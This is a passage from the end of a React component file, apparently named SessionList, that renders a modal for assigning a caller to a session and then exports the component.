        sessionId={placeholderDialog.sessionId}
      />

      {/* Assign Caller Modal */}
      {assignModal.session && (
        <AssignCallerModal
          isOpen={assignModal.isOpen}
          onClose={() => setAssignModal({ isOpen: false, session: null })}
          session={assignModal.session}
          callers={callers}
          onAssign={handleAssignCaller}
        />
      )}
    </div>
  );
};

export default SessionList;
